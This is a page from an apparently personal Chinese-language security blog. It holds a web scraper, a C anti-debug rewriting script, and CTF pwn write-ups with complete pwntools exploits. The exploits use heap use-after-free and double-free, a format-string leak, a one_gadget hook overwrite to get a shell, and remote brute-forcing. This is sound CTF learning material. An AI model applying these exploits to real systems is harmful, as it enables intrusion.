<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-2020-06-27-Python" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/27/2020-06-27-Python/" class="article-date">
  <time class="dt-published" datetime="2020-06-26T16:00:00.000Z" itemprop="datePublished">2020-06-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/27/2020-06-27-Python/">Simple gadgets</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这个是完成了一个获取长理官网新闻文字和图片的小爬虫，完成的功能及其简陋。写完想笑哈哈哈哈哈</p>
<h2 id="6-27"><a href="#6-27" class="headerlink" title="6.27"></a>6.27</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import urllib.request</span><br><span class="line">count=1</span><br><span class="line">jpg_count=1</span><br><span class="line">url=&#x27;https://www.cust.edu.cn/&#x27;</span><br><span class="line">response = requests.get(url)</span><br><span class="line">response.encoding = &#x27;utf-8&#x27;</span><br><span class="line">html = response.text</span><br><span class="line">easy = re.findall(r&#x27;&lt;ul class=&quot;list01&quot;&gt;(.*?)&lt;/ul&gt;&#x27;,html,re.S)</span><br><span class="line">people = re.findall(r&#x27;href=&quot;(.*?)&quot;&#x27;,str(easy),re.S)</span><br><span class="line">for i in people:</span><br><span class="line">    i=&#x27;https://www.cust.edu.cn/&#x27;+i</span><br><span class="line">    file = &quot;E:/new/新闻&quot; + str(count) + &#x27;.html&#x27;</span><br><span class="line">    r = requests.get(i)</span><br><span class="line">    r.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    with open(file, &quot;wb&quot;) as code:</span><br><span class="line">        code.write(r.content)</span><br><span class="line">    count=count+1</span><br><span class="line">    jpg = re.findall(r&#x27;window.open(.*?).jpg&#x27;,r.text,re.S)</span><br><span class="line">    for j in jpg:</span><br><span class="line">        print(j[4:])</span><br><span class="line">        rsp=urllib.request.urlopen(&quot;https://www.cust.edu.cn/&quot;+j[4:]+&quot;.jpg&quot;)</span><br><span class="line">        img=rsp.read()</span><br><span class="line">        file = &quot;E:/new/图片&quot; + str(jpg_count) + &#x27;.jpg&#x27;</span><br><span class="line">        with open(file,&#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(img)</span><br><span class="line">        jpg_count=jpg_count+1</span><br></pre></td></tr></table></figure>

<p>5月份参加了个作品赛，完成了一套linux平台的源代码漏洞加固程序，整合的py脚本如下，然后里边用到的东西在自己github里，也没啥特别有技术含量的东西，就不献丑了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def Findhf(text):</span><br><span class="line">    Headerfile=[]</span><br><span class="line">    x=text.split(&quot;\n&quot;)</span><br><span class="line">    #print(x)</span><br><span class="line">    for i in x:</span><br><span class="line">        if(&#x27;#include&#x27; in i):</span><br><span class="line">            Headerfile.append(i)</span><br><span class="line">    #print(Headerfile)</span><br><span class="line">    return Headerfile</span><br><span class="line"></span><br><span class="line">def Findo(text):</span><br><span class="line">    others=[]</span><br><span class="line"></span><br><span class="line">    x=text.split(&quot;\n&quot;)</span><br><span class="line">    #print(x)</span><br><span class="line">    for i in x:</span><br><span class="line">        if(&#x27;#include&#x27; not in i):</span><br><span class="line">                if(&#x27;main&#x27; not in i):</span><br><span class="line">                    others.append(i)</span><br><span class="line">                else:</span><br><span class="line">                    break</span><br><span class="line">    #print(others)</span><br><span class="line">    return others</span><br><span class="line"></span><br><span class="line">def Findm(text):</span><br><span class="line">    real=[]</span><br><span class="line">    rep=[]</span><br><span class="line">    count=1</span><br><span class="line">    x=text.split(&quot;\n&quot;)</span><br><span class="line">    for i in x:</span><br><span class="line">        if(count==1):</span><br><span class="line">            if(&#x27;main&#x27; in i):</span><br><span class="line">                #print(i)</span><br><span class="line">                count=count-1</span><br><span class="line">        else:</span><br><span class="line">                if(&#x27;&#125;&#x27; != i):</span><br><span class="line">                    real.append(i)</span><br><span class="line">                else:</span><br><span class="line">                    print(&#x27;found finish&#x27;)</span><br><span class="line">    for a in real:</span><br><span class="line">        if(&#x27;write&#x27; in a):</span><br><span class="line">            te=a.split(&#x27;,&#x27;)</span><br><span class="line">            del te[0]</span><br><span class="line">            te.pop()</span><br><span class="line">            place=&#x27;,&#x27;.join(te)</span><br><span class="line">            place=&#x27;    mywrite(&#x27;+place+&#x27;);&#x27;</span><br><span class="line">            rep.append(place)</span><br><span class="line">        else:</span><br><span class="line">            rep.append(a)</span><br><span class="line">    #print(rep)</span><br><span class="line">    return rep</span><br><span class="line"></span><br><span class="line">def antidebug(text):</span><br><span class="line">    head=Findhf(text)</span><br><span class="line">    oth=Findo(text)</span><br><span class="line">    main_real=Findm(text)</span><br><span class="line">    fp = open(&#x27;head.c&#x27;, &quot;r&quot;, encoding=&#x27;UTF-8&#x27;)</span><br><span class="line">    head0 = fp.read()</span><br><span class="line">    fp = open(&#x27;ot.c&#x27;, &quot;r&quot;, encoding=&#x27;UTF-8&#x27;)</span><br><span class="line">    oth0 = fp.read()</span><br><span class="line">    head1=&#x27;\n&#x27;.join(head)+head0+&#x27;\n&#x27;.join(oth)</span><br><span class="line">    print(head1)</span><br><span class="line">    fp = open(&#x27;mai.c&#x27;, &quot;r&quot;, encoding=&#x27;UTF-8&#x27;)</span><br><span class="line">    main0 = fp.read()</span><br><span class="line">    main1=main0+&#x27;\n&#x27;.join(main_real)</span><br><span class="line">    print(main1)</span><br><span class="line">    text=head1+main1+oth0</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">def start():</span><br><span class="line">    filename = input(&quot;请输入文件名字：&quot;)</span><br><span class="line">    try:</span><br><span class="line">        fp = open(filename, &quot;r&quot;, encoding=&#x27;UTF-8&#x27;)</span><br><span class="line">        print(&quot;%s 文件打开成功&quot; % filename)</span><br><span class="line">        text = fp.read()</span><br><span class="line">        text = antidebug(text)</span><br><span class="line">        outputFileName = &quot;antidebug_&quot;+filename</span><br><span class="line">        f2 = open(outputFileName, &quot;w+&quot;)</span><br><span class="line">        f2.write(text)</span><br><span class="line">    except IOError:</span><br><span class="line">        print(&quot;文件打开失败,%s 文件不存在&quot; % filename)</span><br><span class="line">        start()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    message=&#x27;&#x27;</span><br><span class="line">    while message != &quot;exit&quot;:</span><br><span class="line">        start()</span><br><span class="line">        message = input(&quot;输入exit结束程序 或 输入任意键继续\n&quot;)</span><br></pre></td></tr></table></figure>

<p>下边的就是简单的学python写的几个算法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;test.txt&quot;)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">count = &#123;&#125;</span><br><span class="line">for line in lines:</span><br><span class="line">	tokens = line.strip().split(&#x27; &#x27;)</span><br><span class="line">	for token in tokens:</span><br><span class="line">		if token not in count:</span><br><span class="line">			count[token] = 0</span><br><span class="line">		count[token] += 1</span><br><span class="line"></span><br><span class="line">for word in count:</span><br><span class="line">	print word,count[word]</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"> </span><br><span class="line">num=[];</span><br><span class="line">i=2</span><br><span class="line">for i in range(2,100):</span><br><span class="line">   j=2</span><br><span class="line">   for j in range(2,i):</span><br><span class="line">      if(i%j==0):</span><br><span class="line">         break</span><br><span class="line">   else:</span><br><span class="line">      num.append(i)</span><br><span class="line">print(num)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">求和</span><br><span class="line">total = 0</span><br><span class="line">for i in range(1,101):</span><br><span class="line">	total+=i</span><br><span class="line">print total</span><br><span class="line"></span><br><span class="line">输出素数</span><br><span class="line">def judge(x):</span><br><span class="line">	for i in range(2,x):</span><br><span class="line">		if x%i==0:</span><br><span class="line">			return false</span><br><span class="line">	return true</span><br><span class="line">for i in range(2,101):</span><br><span class="line">	if judge(i):</span><br><span class="line">		print i</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/06/27/2020-06-27-Python/" data-id="cuidJX2wYK-ye3dmR6gxn9Vbg" data-title="Simple gadgets" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-02-25-i春秋公益赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/25/2020-02-25-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2020-02-24T16:00:00.000Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/25/2020-02-25-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/">Some interesting exercises</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="excited"><a href="#excited" class="headerlink" title="excited"></a>excited</h2><blockquote>
<p>UAF</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./excited&quot;)</span><br><span class="line">elf = ELF(&quot;./excited&quot;)</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">libc = elf.libc</span><br><span class="line">def so():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">def new(balength,bacontent,nalength,nacontent):</span><br><span class="line">	p.sendlineafter(&#x27;do :&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;length : &#x27;,str(balength))</span><br><span class="line">	p.sendlineafter(&#x27;&gt; ba : &#x27;,bacontent)</span><br><span class="line">	p.sendlineafter(&#x27;length : &#x27;,str(nalength))</span><br><span class="line">	p.sendlineafter(&#x27;&gt; na : &#x27;,nacontent)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;do :&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;SCP project ID : &#x27;,str(ind))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;do :&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Banana ID : &#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">#leak heap</span><br><span class="line">new(0x20,&#x27;0&#x27;*0x10,0x20,&#x27;1&#x27;*0x10)#0</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;na is &#x27;)</span><br><span class="line">heap=u64(p.recvline()[0:4].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print hex(heap)</span><br><span class="line">new(0x70,&#x27;2&#x27;*0x10,0x60,&#x27;3&#x27;*0x10)#1</span><br><span class="line">new(0x70,&#x27;4&#x27;*0x10,0x60,&#x27;5&#x27;*0x10)#2</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">new(0x60,p64(heap+0x140)+&#x27;6&#x27;*80+p64(0x7f),0x60,&#x27;7&#x27;*0x10)#3</span><br><span class="line"></span><br><span class="line">new(0x60,&#x27;a&#x27;*16,0x70,&#x27;9&#x27;*0x50)#4</span><br><span class="line">new(0x60,&#x27;a&#x27;*16+p64(0x6020A8),0x70,&#x27;9&#x27;*0x50)#4</span><br><span class="line">show(4)</span><br><span class="line">p.recvuntil(&#x27;ba is &#x27;)</span><br><span class="line">print p.recv()</span><br></pre></td></tr></table></figure>

<p>Because this question had already read flag into the memory , so we can use pointer which point content to read flag .</p>
<h2 id="interested"><a href="#interested" class="headerlink" title="interested"></a>interested</h2><blockquote>
<p>UAF too</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./interested&quot;)</span><br><span class="line">elf = ELF(&quot;./interested&quot;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">libc = elf.libc</span><br><span class="line">def so():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">def add(balength,bacontent,nalength,nacontent):</span><br><span class="line">	p.sendlineafter(&#x27;do :&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;length : &#x27;,str(balength))</span><br><span class="line">	p.sendafter(&#x27;O :&#x27;,bacontent)</span><br><span class="line">	p.sendlineafter(&#x27;length :&#x27;,str(nalength))</span><br><span class="line">	p.sendafter(&#x27;RE :&#x27;,nacontent)</span><br><span class="line">def edit(ind,bacontent,nacontent):</span><br><span class="line">	p.sendlineafter(&#x27;do :&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;ID : &#x27;,str(ind))</span><br><span class="line">	p.sendlineafter(&#x27;O :&#x27;,bacontent)</span><br><span class="line">	p.sendlineafter(&#x27;RE :&#x27;,nacontent)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;do :&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;ID : &#x27;,str(ind))</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;do :&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;ID : &#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">p.sendafter(&#x27;please:&#x27;,&#x27;OreOOrereOOreO%p.%p&#x27;)</span><br><span class="line">#0x3c6780</span><br><span class="line">p.sendlineafter(&#x27;do :&#x27;,&#x27;0&#x27;)</span><br><span class="line">p.recvuntil(&#x27;OreOOrereOOreO&#x27;)</span><br><span class="line">data = p.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">libc = int(data.split(&#x27;0x&#x27;)[2],16)-0x3c6780</span><br><span class="line">one = libc+0xf1147</span><br><span class="line">print hex(libc)</span><br><span class="line">add(0x60,&#x27;a&#x27;,0x50,&#x27;b&#x27;)#1</span><br><span class="line">add(0x60,&#x27;c&#x27;,0x50,&#x27;d&#x27;)#2</span><br><span class="line">add(0x20,&#x27;e&#x27;,0x20,&#x27;f&#x27;)#3</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">edit(1,p64(libc+0x3c4b10-0x23),p64(libc+0x3c4b10-0x23))</span><br><span class="line">add(0x60,&#x27;a&#x27;,0x60,&#x27;a&#x27;*(0x13)+p64(one))</span><br><span class="line">#add(0x60,&#x27;a&#x27;*(0x13)+p64(one),0x20,&#x27;b&#x27;*0x20)</span><br><span class="line">#so()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>There are too many loopholes in this question .</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/02/25/2020-02-25-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/" data-id="cuid6cCL3KxCEb1IRPPji5jgR" data-title="Some interesting exercises" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-11-11-6th_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/11/2019-11-11-6th_week/" class="article-date">
  <time class="dt-published" datetime="2019-11-10T16:00:00.000Z" itemprop="datePublished">2019-11-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/11/2019-11-11-6th_week/">sixth week</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本周是第六周了，继续佛系刷题，上周的红帽杯 pwn 题就 3 道，但是我第一道就不会，最后还是通过各种姿势了解到了怎么搞，神他妈爆破 pwn</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">tmp=&#x27;&#x27;</span><br><span class="line">for j in range(0,32):</span><br><span class="line">	for i in range(33,127):</span><br><span class="line">		io = remote(&#x27;47.104.190.38&#x27;,12001)</span><br><span class="line">		io.recvuntil(&quot;Give me a index:\n&quot;)</span><br><span class="line">		pay = str(j)</span><br><span class="line">		io.sendline(pay)</span><br><span class="line">		io.recvuntil(&quot;Three is good number,I like it very much!\n&quot;)</span><br><span class="line">		payload = &#x27;\x8B\x01\xC3&#x27;</span><br><span class="line">		io.send(payload)</span><br><span class="line">		io.recvuntil(&quot;Leave you name of size:\n&quot;)</span><br><span class="line">		payload = &#x27;50&#x27;</span><br><span class="line">		io.sendline(payload)</span><br><span class="line">		io.recvuntil(&quot;Tell me:\n&quot;)</span><br><span class="line">		a = chr(i)</span><br><span class="line">		payload = a</span><br><span class="line">		io.send(payload)</span><br><span class="line">		if(io.recv()==&#x27;1\n&#x27;):</span><br><span class="line">			tmp+=chr(i)</span><br><span class="line">		io.close()</span><br><span class="line">print tmp</span><br></pre></td></tr></table></figure>

<p>说实话，我看这题一开始是一点思路没有，下面说一下我当时的心路历程</p>
<ul>
<li>因为只能控制 3 个字节，就一直想着怎么跳转，但是 mmap 区域有点问题，而且短跳转没什么可以利用的，最多能跳到 vsdo 里边，走不通</li>
<li>然后就想着怎么通过 3 个字节比如 push 寄存器后 ret 的操作来整，发现也行不通，没什么可以利用的值</li>
</ul>
<p>最后才注意到函数流程，原来判断还是有用的，其实还是想的太粗糙，就想 get shell ，其实 get flag 即可~~~~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v7 = v6(1);</span><br><span class="line">if ( v5 == v7 )</span><br><span class="line">  result = sub_80506F0(&quot;1&quot;);</span><br><span class="line">else</span><br><span class="line">  result = sub_80506F0(&quot;2&quot;);</span><br></pre></td></tr></table></figure>

<p>其实回过头来看基本上就是告诉你了，就是爆破，奈何我直接忽略了后边的 if 语句~~~ 所以还是得多看题多总结啊，现在就深入总结以下本题逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int sub_8048B5C()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v1; // ecx</span><br><span class="line">  int v2; // edx</span><br><span class="line">  unsigned int v3; // et1</span><br><span class="line">  int v4; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int v5; // [esp+10h] [ebp-18h]</span><br><span class="line">  int (__cdecl *v6)(signed int); // [esp+14h] [ebp-14h]</span><br><span class="line">  int v7; // [esp+18h] [ebp-10h]</span><br><span class="line">  unsigned int v8; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(0x14u);</span><br><span class="line">  sub_80506F0(&quot;Give me a index:&quot;);</span><br><span class="line">  v5 = sub_8048ADF(unk_80F6C80);</span><br><span class="line">  v6 = (int (__cdecl *)(signed int))sub_8071C50(0, 4096, 7, 34, 0, 0);</span><br><span class="line">  sub_80506F0(&quot;Three is good number,I like it very much!&quot;);</span><br><span class="line">  sub_8070EA0(0, v6, 3);</span><br><span class="line">  sub_80506F0(&quot;Leave you name of size:&quot;);</span><br><span class="line">  sub_804FCF0(&quot;%d&quot;, (unsigned int)&amp;v4);</span><br><span class="line">  if ( v4 &lt; 0 || v4 &gt; 512 )</span><br><span class="line">    sub_804F260(0);</span><br><span class="line">  sub_80506F0(&quot;Tell me:&quot;);</span><br><span class="line">  sub_8070EA0(0, &amp;unk_80F6CC0, v4 - 1);</span><br><span class="line">  v7 = v6(1);</span><br><span class="line">  if ( v5 == v7 )</span><br><span class="line">    result = sub_80506F0(&quot;1&quot;);</span><br><span class="line">  else</span><br><span class="line">    result = sub_80506F0(&quot;2&quot;);</span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  v2 = v3 ^ v8;</span><br><span class="line">  if ( v3 != v8 )</span><br><span class="line">    sub_8073110(v1, v2);</span><br><span class="line">  return 